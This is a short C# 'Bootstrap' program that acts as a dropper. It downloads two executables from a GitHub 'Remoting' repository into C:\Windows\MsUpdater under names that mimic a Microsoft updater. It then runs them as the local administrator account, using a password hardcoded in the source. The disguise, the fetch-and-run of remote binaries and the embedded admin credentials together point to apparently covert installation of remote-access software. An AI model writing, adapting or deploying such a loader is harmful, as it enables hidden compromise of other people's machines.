namespace Bootstrap
{
    using System;
    using System.Diagnostics;
    using System.Net;
    using System.Security;
    using System.Security.Principal;

    internal class Program
    {
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            const string AdminTarget = @"C:\Windows\MsUpdater\MsUpdater.exe";
            const string UserTarget = @"C:\Windows\MsUpdater\MsUpdater2.exe";

            if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                using (var client = new WebClient())
                {
                    const string Base = "https://github.com/Wiciaki/Remoting/blob/master/Internal/";
                    const string Raw = "?raw=true";

                    client.DownloadFile(Base + "MsUpdater.exe" + Raw, AdminTarget);
                    client.DownloadFile(Base + "MsUpdater2.exe" + Raw, UserTarget);
                }
                
                return;
            }

            var password = new SecureString();

            foreach (var a in "abc123kappa")
            {
                password.AppendChar(a);
            }

            // ReSharper disable once PossibleNullReferenceException
            Process.Start(@"C:\Windows\MsUpdater\Bootstrap.exe", "administrator", password, string.Empty).WaitForExit();
            Process.Start(AdminTarget, "administrator", password, string.Empty);
            Process.Start(UserTarget);
        }
    }
}